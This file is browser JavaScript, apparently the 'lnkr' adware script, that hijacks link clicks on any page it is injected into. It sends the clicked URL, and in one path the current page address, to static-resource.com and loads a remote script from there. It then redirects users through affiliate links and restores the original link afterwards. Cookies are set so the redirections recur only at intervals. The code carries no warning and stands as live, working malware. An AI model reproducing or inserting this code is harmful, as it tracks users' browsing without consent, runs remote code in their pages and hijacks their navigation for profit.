(function (window) {
    var apiHost = "static-resource.com";
    var apiUrl = (location.protocol=='https:'?'https:':'http:')+"//static-resource.com/newapi/api?sourceId=1009&key=5f688b18da187d591a1d8d3ae7ae8fd008cd7871";
    var apiBlankUrl = (location.protocol=='https:'?'https:':'http:')+"//static-resource.com/redir/?sourceId=1009&key=5f688b18da187d591a1d8d3ae7ae8fd008cd7871";
    var uid = "7490x";
    var probability = "100";
    var excludeDomains = "".split(',');
    var isIeEightOrLess = Boolean(document.attachEvent);
    var investigateInnerUrls = !!"";
    var useCustomDomain = !!"";
    var innerUrl = null;
    var allowTargetBlank = ("false" === "true");
    var clickHostname = null;
    var documentHostname = canonicalizeHostname(document.location.hostname);

window["_lnkr1009"] = window["_lnkr1009"] || {};
if (window["_lnkr1009"].excludeDomains) {
    for (var i in window["_lnkr1009"].excludeDomains) {
        excludeDomains.push(window["_lnkr1009"].excludeDomains[i]);
    }
}
if (window["_lnkr1009"].uid) {
    uid = window["_lnkr1009"].uid;
}
if (typeof window["_lnkr1009"].allowTargetBlank != 'undefined') {
    allowTargetBlank = (window["_lnkr1009"].allowTargetBlank);
}
if (typeof window["_lnkr1009"].host != 'undefined') {
    clickHostname = (window["_lnkr1009"].host);
}

if (uid) {
    apiUrl += '&uid='+encodeURIComponent(uid);
    apiBlankUrl += '&uid='+encodeURIComponent(uid);
}
apiBlankUrl += '&format=go';

var ficCookieName = '__lfcc';

function createCookie(name,value,seconds) {
    var expires = "";
    if (seconds) {
        var date = new Date();
        date.setTime(date.getTime()+(seconds*1000));
        expires = "; expires="+date.toGMTString();
    }
    document.cookie = name+"="+value+expires+"; path=/";
}

function readCookie(name) {
    var nameEQ = name + "=";
    var ca = document.cookie.split(';');
    for(var i=0;i < ca.length;i++) {
        var c = ca[i];
        while (c.charAt(0)==' ') c = c.substring(1,c.length);
        if (c.indexOf(nameEQ) == 0) return c.substring(nameEQ.length,c.length);
    }
    return null;
}

function regexpQuote(str) {
    return (str + "").replace(/([.?*+^$[\]\\(){}|-])/g, "\\$1");
}

function stringTrim(str) {
    return str.replace(/^\s+|\s+$/g, "");
}

function getParams(str) {
    var i = 0, length = str.length, ret = '';
    for ( ; i < length; ) {
        ret += String.fromCharCode(77 ^ str.charCodeAt(i++));
    }
    return ret;
}

function processUrl(url)
{
    return url;
    var pos = url.indexOf('?');
    if (pos < 0) {
        return url;
    } else {
        var params = url.substr(pos+1);
        url = url.substr(0,pos);
        return url+'?a='+encodeURIComponent(getParams(params));
    }
}

function redirect(a, url, isBlankFormat) {
    try {
        var originalUrl = a.getAttribute('href');

        a.setAttribute('href', url);
        a.setAttribute('lnkr_redirecting', true);

        if (!isBlankFormat) {
//                console.log("Do click",a);
            a.click();
        } else {
//                console.log("Default click action will be fired");
        }
        if (originalUrl && originalUrl != url) {
            setTimeout(function () {
                    a.setAttribute('href', originalUrl);
                }
                , 500);
        }
        setTimeout(function () {
                a.removeAttribute('lnkr_redirecting');
            }
            , 500);
    } catch (e) {
        window.location.href = url;
    }
}

function getRandomInt(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}

function canonicalizeHostname(hostname) {
    return hostname.toLowerCase().replace(/^www\./, "").replace(/:.*$/, "");
}

function isDomainsEqual(hostname1, hostname2) {
    var h1Parts = hostname1.split(".");
    var h2Parts = hostname2.split(".");

    if (h1Parts && h1Parts.length && h2Parts && h2Parts.length) {
        h1Parts.reverse();
        h2Parts.reverse();

        var length = (h1Parts.length > h2Parts.length) ? h2Parts.length : h1Parts.length;
        var depth = 1;

        for (var i = 0; i < length; i++) {
            if (depth > 3) {
                break;
            }

            if (!h1Parts[i] || !h2Parts[i] || h1Parts[i] != h2Parts[i]) {
                return false;
            }

            depth++;
        }

        return true;
    }

    return false;
}

function checkInternalUrlInLink(a) {
    innerUrl = null;
    var matches, value, innerUrlEl, innerUrlHostname;

    if (matches = a.href.match(/^[^\?]+\?(.+)/)) {
        var query = matches[1];

        if (query) {
            var params = query.split("&");

            if (params && params.length) {
                for (var i = 0; i < params.length; i++) {
                    var nameValue = params[i].split("=");
                    value = decodeURIComponent(nameValue[1]);

                    if (!/^https?:/i.test(value)) {
                        value = null;
                    }
                }
            }
        }
    }

    if (matches = a.href.match(/^[^?]+(https?:\/\/.+)/)) {
        value = matches[1];
    }

    if (value) {
        var aHostname = canonicalizeHostname(a.hostname);

        innerUrlEl = document.createElement("a");
        innerUrlEl.href = value;

        innerUrlHostname = canonicalizeHostname(innerUrlEl.hostname);

        if (!isDomainsEqual(innerUrlHostname, aHostname) &&
            !isDomainsEqual(innerUrlHostname, documentHostname)) {
            innerUrl = value;

            return true;
        } else {
            return false;
        }
    }

    return null;
}

function isRewritable(a) {
    if (!a.hostname
        || !/^https?:$/i.test(a.protocol)
        || -1 !== a.className.indexOf("jq-aff-off")) {
        return false;
    }
    if (!allowTargetBlank && a.target && a.target == '_blank') {
        //console.log("LInk skipped as target=_blank");
        return false;
    }

    if (null != a.getAttribute("onclick")
        && "" != a.getAttribute("onclick")
        && "" == document.referrer) {
        return false;
    }

    if (investigateInnerUrls) {
        var internalUrlExistsAndAllowed = checkInternalUrlInLink(a);

        if (null !== internalUrlExistsAndAllowed) {
            return internalUrlExistsAndAllowed;
        }
    }

    var fileExtensions = /\.(jpg|png|jpeg|gif|bmp|doc|pdf|xls)$/;
    if (a.pathname && a.pathname.match(fileExtensions))
    {
        return false;
    }

    // check excludeDomains option
    if (typeof excludeDomains !== "undefined" && excludeDomains != "" && excludeDomains.length) {
        for (var i = 0; i < excludeDomains.length; i++) {
            if (excludeDomains[i] == "") {
                continue;
            }
            var domainRegexp = new RegExp(regexpQuote(stringTrim(excludeDomains[i])));

//                console.log("check domains skip",a.hostname,domainRegexp);
            if (a.hostname.match(domainRegexp)) {
//                    console.log("Domain matched");
                return false;
            }
        }
    }

    return (canonicalizeHostname(a.hostname) != documentHostname || ( !window._lnkr_nt_active && "" == document.referrer ));
}

function isFirstInnerLink(a) {
    if (!a.hostname) {
        return false;
    }

    return (canonicalizeHostname(a.hostname) == documentHostname ||
            canonicalizeHostname(a.hostname).indexOf(documentHostname) > -1 ||
            documentHostname.indexOf(canonicalizeHostname(a.hostname)) > -1
        ) && "" == document.referrer;
}

function documentClickHandler(event) {
    if (isIeEightOrLess) {
        event = event || window.event;
    }

    if ("which" in event && 3 == event.which /* Gecko (Firefox), WebKit (Safari/Chrome) & Opera */
        || "button" in event && 2 == event.button /* IE, Opera */) {
        // prevent processing when right mouse button has been clicked
        return;
    }

    if (!onClick(event)) {
        if (isIeEightOrLess) {
            event.returnValue = false;
        } else {
            event.preventDefault();
        }
    }
}

function onClick(event) {
    var targetName = (isIeEightOrLess) ? "srcElement" : "target";
    var b, c = event[targetName];

    do {
        try {
            b = c.nodeType;
        } catch (d) {
            break;
        }

        if (1 === b && (a = c.tagName.toUpperCase(), "A" === a || "AREA" === a)) {
            var key = event.ctrlKey || event.metaKey || event.altKey || event.shiftKey, //prevent clicks with ctrl etc. (breaks some browser functions)
                which = event.which && 1 === event.which /*All*/ || 0 === event.button /*IE<9*/, //prevent right and middle click (also breaks some browser functions)
                a = c;
            if (!(a && !key && which && isRewritable(a))) {
//                    console.log("skip link processing", a);
                return true;
            }

            if (a.getAttribute('lnkr_redirecting')) {
                return true;
            }
            if (a.getAttribute('data-ad-flag')) {
                return true;
            }

            if (isRewritable(c)) {
//                    console.log("Link rewritable", c);
                if (isFirstInnerLink(c)) {
                    var cookieValue = readCookie(ficCookieName);
                    if (cookieValue == 1)
                    {
//                            console.log('paused first click processing by limit');
                        return true;
                    }
                }
                if (a.target && a.target == '_blank') {
                    processBlankLink(event, c);
                    //don't brake default browsers action to prevent newtab open's blocking
                    return true;
                } else {
                    if (processLink(event, c) !== true)
                        return false;
                }
            }
        }

        c = c.parentNode;
    } while (c);

    return true;
}

function insertScript(src) {
//    console.log('insertScript');
    var head = document.getElementsByTagName("head")[0] || document.documentElement;
    var script = document.createElement("script");
    script.type = "text/javascript";
    script.async = true;
    script.src = src;

    head.insertBefore(script, head.firstChild);
}

function processLink(event, a) {
    var randomInt = getRandomInt(1, 93435);
    var nmcCookieName = '__lncc_'+ a.hostname;

    if (readCookie(nmcCookieName) == 1) {
        return true;
    }

    window["func" + randomInt] = (function () {
        return function (affiliatedUrl) {
            if (affiliatedUrl) {
                try {
                    if (window["__lr_fic"]) {
                        createCookie(ficCookieName, 1, 86400);
                    } else {
                        createCookie(nmcCookieName, 1, 1800);
                    }
                }
                catch (e)
                {
                    //do nothing
                }
                clearTimeout(timeoutId);
                redirect(a, affiliatedUrl);
            }
        }
    })();

    var url = a.href;
    if (location.hostname.indexOf('google') >= -1) {
        var dataUrl = a.getAttribute('data-href');
        if (dataUrl)
            url = dataUrl;
    }
    var scriptUrl = apiUrl + "&stub=" + randomInt;
    if (useCustomDomain && clickHostname) {
        scriptUrl += "&host="+clickHostname;
    }

    if (investigateInnerUrls && null !== innerUrl) {
        scriptUrl += "&out=" + encodeURIComponent(innerUrl);
        scriptUrl += "&originalUrl=" + encodeURIComponent(url);
        scriptUrl += "&documentHostname=" + encodeURIComponent(documentHostname);
    } else {
        scriptUrl += "&out=" + encodeURIComponent(url);
    }
    if (isFirstInnerLink(a)) {
        scriptUrl += "&fic=1";
        window["__lr_fic"] = 1;
    }

    insertScript(processUrl(scriptUrl));

    var timeoutId = setTimeout(function() { redirect(a, url); }, 3000);
}

function processBlankLink(event, a) {
    var url = a.href;
    var checkBlankCookieName = '_lnkr_blnck_'+ a.hostname;
    var redirectUrl = apiBlankUrl;
    if (useCustomDomain && clickHostname) {
        redirectUrl += "&host="+clickHostname;
    }

    var cookieValue = readCookie(checkBlankCookieName);
    if (cookieValue == 1) {
//            console.log('paused blank click processing by limit');
        return true;
    }

    if (location.hostname.indexOf('google') >= -1) {
        var dataUrl = a.getAttribute('data-href');
        if (dataUrl)
            url = dataUrl;
    }

    if (investigateInnerUrls && null !== innerUrl) {
        redirectUrl += "&out=" + encodeURIComponent(innerUrl);
        redirectUrl += "&originalUrl=" + encodeURIComponent(url);
        redirectUrl += "&documentHostname=" + encodeURIComponent(documentHostname);
    } else {
        redirectUrl += "&out=" + encodeURIComponent(url);
    }
    redirectUrl += "&ref=" + encodeURIComponent(location.href);

    if (isFirstInnerLink(a)) {
        redirectUrl += "&fic=1";
        window["__lr_fic"] = 1;
    }

//        console.log("Run blank link opening by url",redirectUrl);
    createCookie(checkBlankCookieName, 1, 3600);
    redirect(a, processUrl(redirectUrl), true);
}

    var attachHandlers = function(){
        if (document.attachEvent) {
            //IE DOM loading handler
            document.attachEvent("onclick", documentClickHandler);
        } else if (document.addEventListener) {
            //Gecko, Webkit, IE9+ DOM load event handler
            document.addEventListener("click", documentClickHandler, false);
        }
    };

    if (typeof probability !== "undefined" && probability < 100) {
        // checking probability
        if (getRandomInt(1, 99) >= probability) {
            return;
        }
    }

    attachHandlers();
})(window);
